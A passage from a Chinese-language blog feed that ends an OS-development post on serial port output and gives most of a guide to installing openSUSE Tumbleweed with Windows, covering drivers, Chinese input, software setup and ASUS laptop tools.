class="hljs-comment">/* wait for the port to be ready */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        res = inb(com_base + COM_REG_LSR);<br>        res &amp;= <span class="hljs-number">0x20</span>;<br>    &#125; <span class="hljs-keyword">while</span> (res == <span class="hljs-number">0</span>);<br><br>    outb(com_base, ch);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们为 QEMU 附加 <code>-nographic</code> 的参数进行测试，可以看到串口输出的数据一切正常：</p><blockquote><p><code>Ctrl + A</code> 后再 <code>C</code> 进入 QEMU 调试台，<code>q</code> 退出</p></blockquote><p><img src="https://s2.loli.net/2024/06/13/27ocRUJMamzyQwK.png" alt="真是串串又口口啊"></p><h2 id="真机启动"><a href="#真机启动" class="headerlink" title="真机启动"></a>真机启动</h2><p>接下来我们使用 <code>make</code> 命令编译代码，将 <code>out</code> 目录下的 <code>kernel.bin</code> 文件放到 U 盘 EFI 分区中的 <code>boot</code> 目录下，重启计算机并选择 U 盘启动，接下来——</p><p><strong>ClosureOS，启动——！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041505.png"></p><p>我们成功制作完成了一个<strong>能够在真机上运行的操作系统，而并非大部分教科书上的那些只能在虚拟机里跑的小玩具</strong>，虽然目前仅有最基本的雏形 ：）</p><blockquote><p>我们将在后续博客当中逐步完善这个操作系统（🕊🕊🕊）</p></blockquote><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://elixir.bootlin.com/linux/latest/source">Linux source code - Bootlin</a></p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">Multiboot2 Specification version 2.0</a></p><p><a href="https://wiki.osdev.org/Main_Page">OSDev wiki</a> ← 非常好维基，使我OS运行，爱来自瓷器❤</p><p><a href="https://zhuanlan.zhihu.com/UEFIBlog">UEFI 和 BIOS 探秘</a></p><p><a href="https://wiki.osdev.org/PC_Screen_Font">PC Screen Font</a></p><p><a href="https://os.phil-opp.com/">Writing an OS in Rust</a></p><p><a href="https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/">https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/</a></p><p><a href="https://oscarcx.com/tech/usb-boot-winpe-and-linux-via-grub2.html">用grub2制作多重引导的WinPE&amp;Linux启动U盘</a></p><p><a href="https://gunkies.org/wiki/Main_Page">Computer History Wiki</a></p><p><a href="https://wiki.osdev.org/Serial_Ports">Serial Ports</a></p><p><a href="https://www.scs.stanford.edu/09wi-cs140/pintos/specs/pc16550d.pdf">PC16550D Universal Asynchronous Receiver&#x2F;Transmitter with FIFOs</a></p><p><a href="https://www.keil.com/dd/vtr/3880/9788.htm">NXP (founded by Philips) LPC2148 — UARTs: (UART0-1)</a></p><p><a href="https://www.lookrs232.com/rs232/lcr.htm">Line Control Register (LCR)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;遥遥领先！遥遥领先！遥遥领先！&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Assembly Language" scheme="https://arttnba3.github.io/tags/Assembly-Language/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x01】如何正确打开 openSUSE Tumbleweed</title>
    <link href="https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/</id>
    <published>2023-11-23T14:22:31.000Z</published>
    <updated>2024-07-03T08:25:55.884Z</updated>
    
    <content type="html"><![CDATA[<p>你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者此前一直在用 Arch Linux，但是最近在帮中国大陆的一些 CTF 赛事出题时遇到了一些比较奇怪的问题：在使用 Docker 启动的 Ubuntu 环境中，用来启动题目服务的 <code>xinetd</code> <strong>无法正常工作</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010554.png"></p><p>不过也不是完全连不上，但是要等很久，笔者怀疑可能是内核安全策略的缘故（因为在容器内部用 <code>nc</code> 也连不上），于是笔者测试了市面上比较主流的口碑比较好的几个 Linux 发行版，除了原生 Ubuntu 以外<strong>也就只有 openSUSE 能够正常运行</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010630.png"></p><blockquote><p>当然， <em>有一个发行版是完全连不上，是谁呢</em> ： </p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010725.png"></p></blockquote><p>这样的话笔者完全没有办法在本地测试题目，再加上 Arch Linux 用起来 <em>总是感觉有哪里没有配好的怪异感</em> ，只适合比较闲的时候折腾玩玩，日常使用或许还是一个常规点的发行版会更加安心一些，于是笔者在 Fedora Workstation 短期驻留了一段时间之后选择转向 openSUSE Tumbleweed ，和 Arch 一样是一个滚动发行版，但是 <em>据说德国工艺比较值得令人信赖，SUSE 在企业市场的份额似乎也不小</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124011110.png"></p><blockquote><p>需要注意的是，openSUSE 这个词读音为 <code>/ˌoʊpənˈsuːzə/</code> ，相信不少人和笔者一样一开始会读成 <code>/ˌoʊpənˈsuːz/</code> ，推荐观看<a href="https://www.bilibili.com/video/BV1ab411K7Zs/">这个视频</a>（笑</p></blockquote><p>事实证明，openSUSE Tumbleweed 给笔者一种<strong>又好又烂的感觉</strong>，好就好在德国工艺的 YaST 确实方便易用， <em>仿佛一个和蔼可亲的邻家大蜥蜴一般令人安心</em> ，不好就在于官方自带的中文安装依托答辩，不仅安装界面蹦方块，切换到 Wayland 后自带的 fcitx5 直接罢工（与此同时<strong>先装英文系统再装中文语言包与输入法却能正常使用</strong>）</p><p>但这并非是最要命的点，<strong>用的人少、社区活跃度不足才是最致命的</strong>，openSUSE 早期在中国大陆宣传不足，RHEL 和 Ubuntu 近乎蚕食掉所有的 Linux 市场后才姗姗来迟，<strong>现在在中国大陆能用的镜像站似乎都不剩几个</strong>，<a href="https://forum.suse.org.cn/">中文论坛</a>活跃度还比不上一些快死了的贴吧（<a href="https://forums.opensuse.org/c/english/6">英文论坛</a>的活跃度还可以， <em>不过事实上国内真正称得上活着的 Linux distro-specific forum 除了 Arch 以外好像也没别的了</em> ，这么一看 openSUSE CN 论坛建设其实还可以 ），Wiki 建设度也不太足，这就导致很多问题只能参照其他发行版的类似情况自己再缝缝补补</p><blockquote><p>最直接的后果就是在缺乏指引的情况下，笔者第一次在物理机上尝试 Tumbleweed 时 docker 直接无法正常拉镜像，第二次在物理机上尝试 Tumbleweed 时由于未更新 GRUB 配置导致几次在几次重新启动系统之后<strong>登录界面直接进不去了，只有一个鼠标能动</strong>，切进 tty 以后也一筹莫展（根本找不到使用 openSUSE 出现类似问题的案例与解决方案），在重装了七八次系统后按照第三方社区 ASUS Linux 的配置教程无意中解决了这个问题</p></blockquote><p>但是 <del>抛开事实不谈</del>  <em>抛开这些小毛病不谈，openSUSE 依旧是做得不错的发行版</em> ，Leap 有着超乎想象的稳定性与维护周期，Tumbleweed 在保证了其稳定性的同时依旧能紧追最前沿的技术，虽然国内没啥人用但在国外其实还是有着不错的口碑，因此笔者最终选择尝试在 openSUSE Tumbleweed 上开始自己新的旅程</p><blockquote><p>至于为什么不用 Ubuntu 是因为 Ubuntu Desktop 依托答辩，经常能卡出各种玄学问题，软件包旧且难配，snap 这样不遵守 FHS 而且后端完全受商业公司 Canonical 把控的混沌邪恶的东西更是让人谔谔，只适合放服务器上或是放在虚拟机里玩</p><p>至于为什么不用 Debian 则是因为在笔者感受起来这也是一个更适合在服务器上稳定跑应用的系统，能折腾的空间也不多（<del>年轻人自己用的电脑当然要滚动发行版天天滚，我每天稳定在 Arch 上滚 114 次在 centos stream 上滚 514 次在 tumbleweed 上滚 1919 次并用 Gentoo 自行编译 810 次</del>）， 当然肯定有人要杠说有 Debian Sid 这样的版本，但是在笔者看来未免有点过于不稳定了， <em>当然更重要的是</em> 笔者手上没有<a href="https://github.com/moesoha/debian-media-box">Debian 盒装安装媒介</a> （笑</p></blockquote><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><blockquote><p>如果要和笔者一样安装 Windows + Linux 双系统的话<strong>建议先安装 Windows</strong>，因为如果先安装 Linux 的话 Windows 会对 Linux 空间乱动 ：(</p></blockquote><blockquote><p>因为安装的时候没有拍屏所以这里笔者用虚拟机进行截图以示意，<del>毕竟总不能让👴把现在安好的系统再重新安一遍吧，那闲得没事做属于是</del></p></blockquote><p>首先还是在 Windows 上打开 <code>磁盘管理→压缩卷</code> 划出来一块未分配空间，后面我们将在这块空间上安装 openSUSE Tumbleweed：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123234639.png"></p><p>然后在<a href="https://get.opensuse.org/tumbleweed/#download">官网</a>下载镜像，并烧录到 U 盘中（大家应该都和笔者一样使用 U 盘进行安装吧），这里笔者选择使用 <a href="https://etcher.balena.io/#download-etcher">balenaEtcher</a> 进行烧录，直接选择镜像和 U 盘就行：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123235028.png"></p><h1 id="0x02-安装-openSUSE-Tumbleweed"><a href="#0x02-安装-openSUSE-Tumbleweed" class="headerlink" title="0x02. 安装 openSUSE Tumbleweed"></a>0x02. 安装 openSUSE Tumbleweed</h1><p>openSUSE 系统使用 <code>YaST</code> 进行安装，非常地舒适简便的同时也提供给我们许多可以客制化的地方</p><blockquote><p>和前面一样都是在虚拟机中重新截的图，因为笔者安装时忘了拍了：）</p></blockquote><p>惯例重启进入 UEFI 界面关闭安全启动将 U 盘设为第一个启动项进入 openSUSE Tumbleweed 的安装界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124003638.png"></p><blockquote><p>如果你是物理机安装而且没插网线会有一个额外的配置网络的环节，按照指引正常选择无线网卡连 WiFi 就行</p></blockquote><p>这里注意<strong>安装语言选择 English</strong>，因为自带的中文安装有些小问题（<a href="https://www.bilibili.com/video/BV1F7411G7jH/?t=2095">他们那个是有点差的.avi</a>），系统安装结束后我们再手动在系统中去安装中文相关的东西：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004125.png"></p><p>Online Repositories 建议全选：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004637.png"></p><p>桌面就按需选择了，笔者推荐选择 openSUSE 默认的 KDE Plasma ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005130.png"></p><p>硬盘分区的话笔者建议还是<strong>手动分区</strong>（选择下方的 <code>Expert Partitioner</code> 按钮中的 <code>Start with Existing Partitions</code>，之后直接选中对应硬盘并 <code>Add Partion...</code> 就会有非常细致的分区创建引导），因为他自动分区的逻辑有点怪怪的（之前自动分区差点把笔者原本的数据盘给抹了），主要是两个分区：</p><ul><li>EFI 分区（<code>EFI Boot Partion</code>，<strong>必须为 fat32 格式</strong>）：放 GRUB 和内核的地方，用来启动系统，需要挂载在 <code>/boot/efi</code> 下边</li><li>系统分区（<code>Operating System</code>，推荐还是 ext4，brtfs 强制重启容易炸）：系统基本环境，需要挂载在 <code>/</code> 下边</li></ul><blockquote><p>这里笔者<strong>不推荐和 Windows 混用同一个 EFI 分区</strong>，最好自己自立门户，一是 Win 原本的 EFI 分区实在太小随便塞点东西就爆了，二是独立分区干啥都方便不会影响到隔壁的 Win</p></blockquote><p>当然，也可以像笔者一样额外分一个分区做数据分区挂在 <code>/home</code> 下边，后面重装各种其他发行版都方便， <em>因为这里是虚拟机演示所以就只分了两个分区</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005751.png"></p><p>时区设置和创建用户这种常规操作笔者就不截图了，最后来到安装前的最后确认环节，这里笔者建议把 Secure Boot 给关了，不然后面升级闭源显卡驱动可能会比较麻烦，<del>以及笔者觉得这个特性在个人电脑上完全没必要，真有人会来打吗</del></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010003.png"></p><p>安装好后会自动重启，这个时候默认进的就是 GRUB 界面了，可以选择进入 Windows 还是 Linux：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124013040.png"></p><p>这里不得不夸的一点是<strong>openSUSE 无缝地将笔者之前的 KDE 美化给迁移了过来</strong>（当笔者从 Arch 往 Fedora 上迁移时、重新安装 Fedora 时，这块都没太能处理好），把 <code>latte-dock</code> 给安装上之后笔者就像没换过系统一样：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/img_v3_025f_b217ee22-634c-432b-95ad-8c5569d0081g.jpg"></p><h1 id="0x03-安装-NVIDIA-Driver"><a href="#0x03-安装-NVIDIA-Driver" class="headerlink" title="0x03. 安装 NVIDIA Driver"></a>0x03. 安装 NVIDIA Driver</h1><p>openSUSE 默认不引入 non-OSS 软件，所以默认为 NVIDIA 显卡安装的是开源的 <code>nouveau</code> 驱动， <del>因为是社区逆向出来的所以不仅功能不全而且性能吊差</del> ，所以我们需要安装 NVIDIA 的官方驱动以获取更好的使用体验。</p><h3 id="闭源驱动（by-default）"><a href="#闭源驱动（by-default）" class="headerlink" title="闭源驱动（by default）"></a>闭源驱动（by default）</h3><blockquote><p>如果你用的是 A 卡或者仅有核显，则可以跳过这一章节</p></blockquote><p>YaST 是很好很强大的一个综合性工具，这也是 SUSE 系发行版的魅力之一，通过 YaST可以非常方便地管理包括软件安装在内的各项系统配置</p><p>首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，她会直接帮你选好需要安装的包，直接安就完事了：）</p><p>当然，你也可以手动进入 <code>YaST-&gt;Software Management-&gt;View-&gt;Repositories-&gt;NVIDIA</code> 选择要安装哪些包，一般来说最新的 NVIDIA 显卡直接选择最新的 <code>G06</code> 相关套件即可，其他的老显卡建议参考 <a href="https://en.opensuse.org/SDB:NVIDIA_drivers">openSUSE Wiki</a>，以笔者的电脑为例安装了以下这些包：</p><p><img src="https://s2.loli.net/2023/11/23/dbWQVyqU7Z1A9SN.png"></p><p>安装过程中 YaST 会自动帮你把 <code>nouveau</code> 给禁用了，完成之后直接重启，在终端输入 <code>nvidia-smi</code> 就可以看到显卡相关信息：</p><p><img src="https://s2.loli.net/2023/11/23/t9Qak3RJx7Yq4Xu.png" alt="image.png"></p><p>接下来更新 Grub 配置，不更新的话多重启几次可能桌面就会莫名其妙寄了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/default/grub<br></code></pre></td></tr></table></figure><p>在这个文件中找到 <code>GRUB_CMDLINE_LINUX</code> ，在其中加入如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">modprobe.<span class="hljs-attribute">blacklist</span>=nouveau rd.driver.<span class="hljs-attribute">blacklist</span>=nouveau nvidia-drm.<span class="hljs-attribute">modeset</span>=1<br></code></pre></td></tr></table></figure><p>应用新的 GRUB 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="开源驱动（only-for-RTX-2000-and-newer）"><a href="#开源驱动（only-for-RTX-2000-and-newer）" class="headerlink" title="开源驱动（only for RTX 2000 and newer）"></a>开源驱动（only for RTX 2000 and newer）</h3><p><del>可能是被 Linus 给 fuck 太多了，</del> NVIDIA <a href="https://developer.nvidia.com/blog/nvidia-releases-open-source-gpu-kernel-modules/">在 2022 年放出了开源的 Linux 内核模块</a>，为 Linuxer 们提供了除了闭源驱动以外的一个新的选择。</p><p>和安装闭源显卡驱动一样，首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，搜索 nvidia,勾上这两个带 <code>open</code> 字样的包之后让 YaST 帮你自动完成即可：</p><p><img src="https://s2.loli.net/2024/04/15/zOhtWciCZRmnLyS.png" alt="笔者这里是已经安装好了所以显示绿底打勾，如果是待安装则通常应当是一个蓝底白十字"></p><h1 id="0x04-安装中文与输入法"><a href="#0x04-安装中文与输入法" class="headerlink" title="0x04. 安装中文与输入法"></a>0x04. 安装中文与输入法</h1><p>openSUSE Tumbleweed 安装媒介中自带的中文有些问题，因此我们需要安装 English 系统后手动将中文给安装上</p><p>首先是将简体中文添加为第二语言（笔者不推荐作为第一语言，否则万一系统崩了以后进入 tty 抢救的时候会让你感到很崩溃），打开 <code>YaST-&gt;System-&gt;Language</code>，勾上 <code>Simplified Chinese</code> 后直接点 <code>OK</code> 就可以自动安装了：</p><p><img src="https://s2.loli.net/2023/11/23/pe6DK84kNB3cSZj.png" alt="image.png"></p><p>需要注意的是这里的进度条会莫名其妙变成负数，<strong>不影响正常安装</strong>，只是我们不能看到正确的进度罢了，慢慢等就行了：</p><p><img src="https://s2.loli.net/2023/11/23/AWh6xErjFi8XVTN.jpg"></p><p>完成中文的安装之后接下来我们来安装输入法，目前 Linux 下最火的中文输入法之一为 <code>fcitx</code>，直接通过 zypper 进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in fcitx5 fcitx5-chinese-addons<br></code></pre></td></tr></table></figure><p>之后在设置里将 virtual keyboard 设为 fcitx5 并添加 input method <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2023/11/23/MPsnu5im38qRI2G.png" alt="image.png"></p><h1 id="0x05-软件相关配置"><a href="#0x05-软件相关配置" class="headerlink" title="0x05. 软件相关配置"></a>0x05. 软件相关配置</h1><h3 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h3><p>比如说大家都喜欢的代码编辑器 <code>vscode</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc<br>sudo zypper addrepo https://packages.microsoft.com/yumrepos/vscode vscode<br>sudo zypper refresh<br>sudo zypper install code<br></code></pre></td></tr></table></figure><p>Chrome 浏览器的安装需要借助 <a href="https://en.opensuse.org/SDB:OBS_Package_Installer">OPI</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in opi<br>sudo opi chrome<br></code></pre></td></tr></table></figure><p>Docker 的安装直接按照 <a href="https://en.opensuse.org/Docker">wiki</a> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install docker docker-compose docker-compose-switch<br>sudo systemctl enable docker<br>sudo usermod -G docker -a $USER # 将当前用户添加到 docker,后面就不用总是 sudo docker 了<br>sudo reboot # 重启就完事了<br></code></pre></td></tr></table></figure><p>openSUSE 是 RPM 系，因此大部分软件其实也可以直接将 rpm 包下载下来用 zypper 安装即可，以<a href="https://www.feishu.cn/download">飞书 Linux 版</a>为例：</p><p><img src="https://s2.loli.net/2023/11/23/3xMHfgpuzaDsXrQ.png" alt="image.png"></p><p>笔者在海外，有的时候会用到 Discord、Telegram 这样的软件，他们都是有 Linux 原生版本的（这里就不得不吐槽国内的一些软件迟迟不出 Linux 版了），直接用 zypper 安装即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in discord telegram-desktop<br></code></pre></td></tr></table></figure><p>一些只有 Windows 版本的软件（例如微信）可以尝试用 <code>wine</code> 打开，使用 zypper 可以直接安装 <code>wine</code>，<code>winetricks</code> 则是用来进行功能补充的小工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in wine winetricks<br></code></pre></td></tr></table></figure><h3 id="安装-Flatpak"><a href="#安装-Flatpak" class="headerlink" title="安装 Flatpak"></a>安装 Flatpak</h3><p>一些 openSUSE 没有的包也可以用 flatpak 从其他地方打过来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in flatpak<br>flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo<br>flatpak update<br></code></pre></td></tr></table></figure><p>接下来让 flatpak 包的升级和 KDE&#x2F;Gnome 的 software update 无缝融合，首先创建 service：</p><blockquote><p>注：为了安全起见，这里我们采用用户级而非系统级配置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.service<br></code></pre></td></tr></table></figure><p>之后写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><span class="hljs-attr">Wants</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">After</span>=network-<span class="hljs-literal">on</span>line.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/bin/flatpak --user uninstall --unused -y --noninteractive <span class="hljs-comment">; /usr/bin/flatpak --user update -y --noninteractive ; /usr/bin/flatpak --user repair</span><br></code></pre></td></tr></table></figure><p>然后用如下命令创建 timer：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.timer<br></code></pre></td></tr></table></figure><p>之后加入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update Trigger<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><br><span class="hljs-section">[Timer]</span><br><span class="hljs-attr">RandomizedDelaySec</span>=<span class="hljs-number">10</span>m<br><span class="hljs-attr">OnBootSec</span>=<span class="hljs-number">2</span>m<br><span class="hljs-attr">OnCalendar</span>=*-*-* <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attr">Persistent</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=timers.target<br></code></pre></td></tr></table></figure><p>完成后启动 timer：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">daemon-reload</span><br>systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">enable</span> --now flatpak-user-update.timer<br></code></pre></td></tr></table></figure><h3 id="配置-Wine"><a href="#配置-Wine" class="headerlink" title="配置 Wine"></a>配置 Wine</h3><p><strong>红酒</strong>（wine）是 Linux 下的一个 Win API 兼容层，实现了对绝大多数常见 Win API 的重写，利用 wine 我们可以在 Linux 下运行相当一部分 Windows 中的 EXE 程序</p><p>首先安装 wine 和 winetricks：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wine winetricks</span><br></code></pre></td></tr></table></figure><p>安装 fakechinese,解决部分程序的中文字体显示为方块字的问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">winetricks fakechinese</span><br></code></pre></td></tr></table></figure><p>大部分情况下<a href="https://github.com/vufa/deepin-wine-wechat-arch/issues/94">通用的解决方案</a>还是下载一份中文字体，例如微软雅黑，之后放到 <code>~/.wine/drive_c/windows/Fonts/</code> 下</p><h3 id="使用-openSUSE-Open-Builid-Service（OBS）"><a href="#使用-openSUSE-Open-Builid-Service（OBS）" class="headerlink" title="使用 openSUSE Open Builid Service（OBS）"></a>使用 openSUSE Open Builid Service（OBS）</h3><p>开放构建服务（Open Build Service</p><p>首先安装 osc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> osc</span><br></code></pre></td></tr></table></figure><h1 id="0x06-ASUS-Laptop-相关的一些配置"><a href="#0x06-ASUS-Laptop-相关的一些配置" class="headerlink" title="0x06. ASUS Laptop 相关的一些配置"></a>0x06. ASUS Laptop 相关的一些配置</h1><blockquote><p>如果你的电脑不是华硕笔记本，可以直接跳过这一部分</p></blockquote><p><a href="https://asus-linux.org/">ASUS Linux</a> 是一个为 ASUS Laptop 提供额外支持的民间社区，通过 <code>asusctl</code> 与 <code>supergfxctl</code> 这两个工具我们可以非常方便地配置笔记本的各种配置</p><p>首先引入 ASUS Linux 的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper ar --priority 50 --refresh https://download.opensuse.org/repositories/home:/luke_nukem:/asus/openSUSE_Tumbleweed/ asus-linux<br></code></pre></td></tr></table></figure><p>安装 <code>asusctl</code>，并用 <code>power-profiles-daemon</code> 替换掉 <code>tlp</code> 作为默认的电源管理服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm tlp<br>sudo zypper in asusctl<br>sudo zypper in power-profiles-daemon<br>sudo systemctl enable --now power-profiles-daemon.service<br>sudo systemctl start asusd<br></code></pre></td></tr></table></figure><p>为了保养电池，可以用 <code>asusctl</code> 将最大充电限制在 80：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo asusctl -c 80<br></code></pre></td></tr></table></figure><p>然后安装 <code>supergfxctl</code> 用以管理显卡，并替换掉过时的 <code>suse-prime</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm suse-prime<br>sudo zypper in supergfxctl<br>sudo systemctl enable --now supergfxd<br></code></pre></td></tr></table></figure><p>例如外出时可以用 <code>supergfxctl</code> 切换到集显输出以省电：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo supergfxctl -s # 查看笔记本支持的视频输出模式<br>sudo supergfxctl -g # 查看当前的视频输出模式<br>sudo supergfxctl -m Integrated # 设置为集显输出<br>sudo supergfxctl -m Hybrid # 设置为混合输出<br></code></pre></td></tr></table></figure><blockquote><p>社区其实还提供了一个图形化配置界面 <code>asusctl-rog-gui</code>，不过其实功能都是一样的：）</p></blockquote><h1 id="0x07-个人配置优化"><a href="#0x07-个人配置优化" class="headerlink" title="0x07. 个人配置优化"></a>0x07. 个人配置优化</h1><h3 id="使用个人账户而非-root-进行特权操作"><a href="#使用个人账户而非-root-进行特权操作" class="headerlink" title="使用个人账户而非 